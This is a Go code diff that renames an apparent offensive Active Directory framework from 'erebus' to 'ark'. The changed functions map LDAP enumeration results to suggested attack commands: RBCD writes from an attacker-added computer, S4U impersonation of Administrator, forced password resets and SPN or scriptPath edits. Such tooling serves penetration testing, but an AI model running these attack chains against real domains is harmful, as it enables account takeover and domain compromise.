@@ -4,7 +4,7 @@ import (
 	"fmt"
 	"strings"
 
-	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
+	pb "github.com/KKingZero/ARK/pkg/pb"
 )
 
 const maxActions = 5
@@ -32,7 +32,7 @@ func ForLDAPEnum(r *pb.LDAPEnumResult) []string {
 		case "asrep_roastable":
 			out = append(out, "ldap_enum query_type=users")
 		case "acl":
-			out = append(out, "host: erebus ldap enum --type interesting", "host: erebus ldap enum --type rbcd")
+			out = append(out, "host: ark ldap enum --type interesting", "host: ark ldap enum --type rbcd")
 		default:
 			out = append(out, "ldap_enum query_type=kerberoastable", "ldap_enum query_type=shadow", "ldap_enum query_type=rbcd")
 		}
@@ -110,18 +110,18 @@ func ForLDAPEnum(r *pb.LDAPEnumResult) []string {
 		out = append(out, fmt.Sprintf("ldap_enum query_type=kerberoastable domain=%s target_dc=%s", r.Domain, r.Dc))
 	case "rbcd":
 		out = append(out, "msDS-AllowedToActOnBehalfOfOtherIdentity set — review who can act")
-		out = append(out, "host: erebus ad add-computer --name ATTACK --yes")
+		out = append(out, "host: ark ad add-computer --name ATTACK --yes")
 		for i, e := range r.Entries {
 			if i >= 2 {
 				break
 			}
 			if sam := ldapAttr(e, "sAMAccountName"); sam != "" {
-				out = append(out, fmt.Sprintf("host: erebus rbcd show --to %s", sam))
+				out = append(out, fmt.Sprintf("host: ark rbcd show --to %s", sam))
 				host := ldapAttr(e, "dNSHostName")
 				if host == "" || strings.HasSuffix(host, "$") {
-					out = append(out, "host: erebus kerberos s4u --impersonate Administrator --spn cifs/<fqdn> [--altservice CIFS/<other>]")
+					out = append(out, "host: ark kerberos s4u --impersonate Administrator --spn cifs/<fqdn> [--altservice CIFS/<other>]")
 				} else {
-					out = append(out, fmt.Sprintf("host: erebus kerberos s4u --impersonate Administrator --spn cifs/%s [--altservice CIFS/<other>]", host))
+					out = append(out, fmt.Sprintf("host: ark kerberos s4u --impersonate Administrator --spn cifs/%s [--altservice CIFS/<other>]", host))
 				}
 			}
 		}
@@ -163,8 +163,8 @@ func ForACL(r *pb.LDAPEnumResult) []string {
 	}
 	if r.TotalResults == 0 && len(r.Entries) == 0 {
 		return Cap([]string{
-			"host: erebus ldap enum --type interesting",
-			"host: erebus ldap enum --type rbcd",
+			"host: ark ldap enum --type interesting",
+			"host: ark ldap enum --type rbcd",
 		})
 	}
 	var out []string
@@ -195,21 +195,21 @@ func ForACL(r *pb.LDAPEnumResult) []string {
 			return false
 		}
 		if has("ForceChangePassword") {
-			add(fmt.Sprintf("host: erebus ad password --target %s --new-pass-file ./new.txt --yes", sam))
+			add(fmt.Sprintf("host: ark ad password --target %s --new-pass-file ./new.txt --yes", sam))
 		}
 		if has("AllowedToAct") || ((has("GenericAll") || has("WriteDacl")) && strings.Contains(cat, "computer")) {
-			add(fmt.Sprintf("host: erebus rbcd write --to %s --from ATTACK$", sam))
+			add(fmt.Sprintf("host: ark rbcd write --to %s --from ATTACK$", sam))
 		}
 		if (has("GenericAll") || has("GenericWrite")) && (cat == "" || strings.Contains(cat, "user") || strings.Contains(cat, "person")) {
-			add(fmt.Sprintf("host: erebus ldap set %s scriptPath <value>", sam))
-			add(fmt.Sprintf("host: erebus ad password --target %s --new-pass-file ./new.txt --yes", sam))
+			add(fmt.Sprintf("host: ark ldap set %s scriptPath <value>", sam))
+			add(fmt.Sprintf("host: ark ad password --target %s --new-pass-file ./new.txt --yes", sam))
 		}
 		if (has("GenericAll") || has("GenericWrite") || has("WriteSPN")) && strings.Contains(cat, "computer") {
-			add(fmt.Sprintf("host: erebus ldap set --target %s servicePrincipalName <SPN> --yes", sam))
+			add(fmt.Sprintf("host: ark ldap set --target %s servicePrincipalName <SPN> --yes", sam))
 		}
 	}
 	if len(out) == 0 {
-		add("host: erebus ldap enum --type interesting")
+		add("host: ark ldap enum --type interesting")
 	}
 	return Cap(out)
 }
